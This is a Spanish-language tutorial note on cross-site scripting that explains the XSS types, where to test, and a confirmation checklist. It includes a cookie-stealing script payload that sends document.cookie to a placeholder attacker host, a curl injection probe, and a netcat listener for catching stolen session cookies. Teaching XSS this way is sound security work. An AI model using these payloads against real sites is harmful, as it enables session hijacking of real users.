## Cross-Site Scripting (XSS)

**XSS** (Cross-Site Scripting) es una vulnerabilidad web en la que se inyecta **código JavaScript** que se ejecuta en el navegador de la víctima. A diferencia de SQLi (que ataca la base de datos), XSS ataca al **usuario del navegador**.

El origen del nombre es confuso (las siglas deberían ser CSS, pero eso ya era "Cascading Style Sheets"); por eso se abrevia **XSS**.

### Cómo funciona

Cuando la aplicación muestra datos introducidos por el usuario **sin sanearlos ni codificarlos**, podemos hacer que se renderice nuestro script como HTML/JS en el navegador de la víctima:

```html
<script>alert('XSS')</script>
```

Un payload típico para robar cookies:

```html
<script>document.location='http://TU_IP/?c='+document.cookie</script>
```

### Tipos de XSS

| Tipo                                | Dónde se ejecuta                    | Característica                          |
| ----------------------------------- | ----------------------------------- | --------------------------------------- |
| **Reflejado (reflected)**           | En la propia petición/respuesta     | El payload viaja en la URL; no se guarda|
| **Almacenado (stored)**             | Se guarda en el servidor            | Más peligroso: afecta a cualquiera que vea la página |
| **DOM-based**                       | En el JavaScript del cliente        | No toca el servidor; manipula el DOM    |

### Dónde probar XSS

- Campos de búsqueda (suelen reflejar la entrada).
- Formularios de comentarios / posts (XSS almacenado).
- Parámetros de la URL (`?q=`, `?id=`, `?user=`).
- Headers que se reflejen en la respuesta (ej. `User-Agent`, `Referer`).

### Confirmación básica

```bash
# Si la página refleja el valor de q, prueba a inyectar:
curl 'http://IP/index?q=<script>alert(1)</script>'
```

### Checklist

1. ¿Hay campos donde la entrada se muestre de vuelta?
2. Comprueba si **sanea** la entrada: prueba `<>"` y observa si se escapa o se renderiza.
3. Prueba un `alert(1)` simple como confirmación.
4. Distingue reflejado vs almacenado (¿queda guardado al recargar/revisitar?).
5. Para robar sesión, usa un payload que exfiltre la cookie a tu servidor de escucha: `nc -lvnp 80`.

> Relacionado: para manipular/inyectar peticiones y ver respuestas usa [BurpSuite](../Fuzzing/BurpSuite.md).